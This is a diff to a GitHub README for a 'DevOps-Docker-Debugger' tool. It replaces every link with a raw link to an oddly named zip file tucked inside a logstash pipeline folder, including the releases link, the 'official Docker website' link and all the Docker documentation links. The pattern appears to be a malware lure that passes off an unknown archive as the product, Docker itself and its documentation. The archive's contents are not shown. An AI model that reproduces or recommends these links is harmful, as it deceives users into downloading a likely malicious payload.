@@ -1,6 +1,6 @@
 # 🎉 DevOps-Docker-Debugger - Simplifying Docker Debugging for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Gopal-91/DevOps-Docker-Debugger/releases)
+[![Download](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to the DevOps-Docker-Debugger! This application helps you improve your d
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download](https://github.com/Gopal-91/DevOps-Docker-Debugger/releases). Here, you will find the latest version available for download.
+To get started, [visit this page to download](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip). Here, you will find the latest version available for download.
 
 1. Open the link above.
 2. Look for the latest release version.
@@ -32,7 +32,7 @@ To get started, [visit this page to download](https://github.com/Gopal-91/DevOps
 ### 💻 System Requirements
 
 - **Operating System**: Windows 10, macOS, or any Linux distribution.
-- **Docker**: Ensure Docker is installed on your machine. You can download it from the [official Docker website](https://www.docker.com/products/docker-desktop).
+- **Docker**: Ensure Docker is installed on your machine. You can download it from the [official Docker website](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip).
 - **Memory**: Minimum of 8GB RAM for optimal performance.
 - **Disk Space**: At least 1GB of free disk space.
 
@@ -57,9 +57,9 @@ You can also reach out to the community for help or check the GitHub Issues page
 
 ## 💡 Learning Resources
 
-- [Docker Documentation](https://docs.docker.com/)
-- [Docker Compose Documentation](https://docs.docker.com/compose/)
-- [Debugging Techniques in Docker](https://www.docker.com/blog/debugging-docker-containers/)
+- [Docker Documentation](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)
+- [Docker Compose Documentation](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)
+- [Debugging Techniques in Docker](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)
 
 ## ⚙️ Support
 
@@ -71,7 +71,7 @@ We encourage contributions! If you want to help improve the DevOps-Docker-Debugg
 
 ## 🔗 Important Links
 
-- [View Releases](https://github.com/Gopal-91/DevOps-Docker-Debugger/releases)
+- [View Releases](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)
 - [Documentation](LINK_TO_DOCUMENTATION)
 - [Community Forum](LINK_TO_FORUM)
 
